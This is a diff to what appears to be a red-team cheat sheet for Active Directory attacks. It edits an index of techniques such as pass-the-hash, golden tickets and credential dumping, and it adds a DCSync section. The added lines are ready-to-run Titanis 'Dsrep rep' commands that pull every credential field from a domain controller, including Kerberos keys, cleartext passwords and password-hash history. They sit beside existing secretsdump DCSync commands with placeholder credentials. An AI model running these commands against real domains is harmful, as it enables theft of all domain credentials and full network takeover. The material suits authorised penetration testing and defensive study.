@@ -26,21 +26,21 @@
   - [Change Password](#change-password) · `changepasswd.py`
   - [Golden / Silver Ticket](#golden--silver-ticket) · `ticketer.py`
 - [3. SMB / File Operations](#3-smb--file-operations)
-  - [List Shares](#list-shares) · `smbclient.py -shares` · `asmbshareenum`
-  - [Browse / List Files](#browse--list-files) · `smbclient.py` · `asmbclient`
-  - [Download a File](#download-a-file) · `smbclient.py get` · `asmbgetfile`
+  - [List Shares](#list-shares) · `smbclient.py -shares`
+  - [Browse / List Files](#browse--list-files) · `smbclient.py`
+  - [Download a File](#download-a-file) · `smbclient.py get`
   - [Download with Backup Semantics](#download-with-backup-semantics)
   - [Upload a File](#upload-a-file) · `smbclient.py put`
   - [Create / Remove Directories and Files](#create--remove-directories-and-files) · `smbclient.py`
   - [List Named Pipes](#list-named-pipes) · `smbclient.py`
-  - [Pass the Hash — SMB](#pass-the-hash--smb) · `smbclient.py -hashes` · `asmbclient`
-  - [SMB over SOCKS5](#smb-over-socks5) · `proxychains smbclient.py` · `asmbclient`
-  - [Enumerate Open Files / Sessions](#enumerate-open-files--sessions) · `netview.py` · `asmbclient`
+  - [Pass the Hash — SMB](#pass-the-hash--smb) · `smbclient.py -hashes`
+  - [SMB over SOCKS5](#smb-over-socks5) · `proxychains smbclient.py`
+  - [Enumerate Open Files / Sessions](#enumerate-open-files--sessions) · `netview.py`
   - [Remote File Timestomping](#remote-file-timestomping)
   - [VSS Snapshot Enumeration](#vss-snapshot-enumeration) · `smbclient.py list_snapshots`
   - [NTFS Alternate Data Streams](#ntfs-alternate-data-stream-ads-enumeration)
   - [Server NIC Enumeration](#server-nic-enumeration)
-  - [Bulk Share Enumeration](#bulk-share-enumeration) · `smbclient.py` · `asmbscanner`
+  - [Bulk Share Enumeration](#bulk-share-enumeration) · `smbclient.py`
 - [4. Credential Dumping](#4-credential-dumping)
   - [LSASS Minidump Parsing](#lsass-minidump-parsing-offline)
   - [Dump SAM Hashes](#dump-sam-hashes) · `secretsdump.py -sam`
@@ -53,7 +53,7 @@
   - [NTDS Dump via Diskshadow](#ntds-dump-via-diskshadow) · `wmiexec.py` · `smbclient.py`
   - [NTDS Dump via Kerb-Key-List](#ntds-dump-via-kerb-key-list-rodc) · `secretsdump.py -use-keylist`
   - [NTDS Offline Parsing](#ntds-offline-parsing) · `secretsdump.py`
-  - [DCSync](#dcsync) · `secretsdump.py -just-dc-ntlm`
+  - [DCSync](#dcsync) · `secretsdump.py` · `Dsrep rep`
 - [5. Enumeration](#5-enumeration)
   - [Domain Users (SAMR)](#enumerate-domain-users-samr) · `samrdump.py` · `net.py`
   - [Groups / Local Aliases](#enumerate-groups--local-aliases) · `net.py group` · `net.py localgroup`
@@ -80,7 +80,7 @@
 - [8. Certificates](#8-certificates)
   - [Self-Signed PFX Generation](#self-signed-pfx-generation)
   - [ADCS Template Enumeration](#adcs-certificate-template-enumeration) · `netexec ldap -M adcs`
-  - [ADCS ESC1](#adcs-esc1--enroll-and-recover-nt-hash) · `asmbcertreq`
+  - [ADCS ESC1](#adcs-esc1--enroll-and-recover-nt-hash)
 - [9. Exotic Credential Harvest](#9-exotic-credential-harvest)
   - [certsync — Golden Cert + UnPAC the Hash](#certsync--golden-cert--unpac-the-hash)
   - [DPAPI Domain Backup Key — Mass Credential Decryption](#dpapi-domain-backup-key--mass-credential-decryption)
@@ -1620,7 +1620,6 @@ gosecretsdump -ntds ntds.dit -system SYSTEM -out hashes.txt
 
 ### DCSync
 
-> **Titanis status:** MS-DRSR not yet implemented. Use Metasploit, pypykatz, or impacket. Feed recovered hashes into Titanis PTH flows.
 
 ```bash
 # pypykatz — full domain dump
@@ -1666,6 +1665,35 @@ secretsdump -just-dc-ntlm DOMAIN/Administrator:Password123@192.168.1.1
 secretsdump -just-dc-ntlm -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/Administrator@192.168.1.1
 # gopacket — DCSync single user
 secretsdump -just-dc-user DOMAIN/krbtgt DOMAIN/Administrator:Password123@192.168.1.1
+
+# Titanis — all objects, all credential fields
+Dsrep rep -UserName Administrator@DOMAIN -Password 'Password123' dc01.domain.local \
+  -EncryptRpc \
+  -OutputFields samAccountName, objectSid, kerberosKeys, kerberosOldKeys, cleartextPassword, unicodePwd, lmPwdHistory, ntPwdHistory \
+  -OutputStyle List
+
+# Titanis — single user
+Dsrep rep -UserName Administrator@DOMAIN -Password 'Password123' dc01.domain.local \
+  -EncryptRpc \
+  -OutputFields samAccountName, objectSid, kerberosKeys, kerberosOldKeys, cleartextPassword, unicodePwd, lmPwdHistory, ntPwdHistory \
+  -OutputStyle List krbtgt
+
+# Titanis — pass-the-hash
+Dsrep rep -UserName Administrator -UserDomain DOMAIN \
+  -NtlmHash A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 dc01.domain.local \
+  -EncryptRpc \
+  -OutputFields samAccountName, objectSid, kerberosKeys, kerberosOldKeys, cleartextPassword, unicodePwd, lmPwdHistory, ntPwdHistory \
+  -OutputStyle List
+
+# Titanis — Kerberos (use DC hostname; -Kdc obtains TGT inline)
+Dsrep rep -UserName Administrator -UserDomain DOMAIN -Password 'Password123' \
+  -Kdc 192.168.1.1 dc01.domain.local \
+  -EncryptRpc \
+  -OutputFields samAccountName, objectSid, kerberosKeys, kerberosOldKeys, cleartextPassword, unicodePwd, lmPwdHistory, ntPwdHistory \
+  -OutputStyle List
+
+# Titanis — enumerate DCs first
+Dsrep dcinfo -UserName Administrator@DOMAIN -Password 'Password123' 192.168.1.1
 ```
 
 [↑ Back to Index](#index)
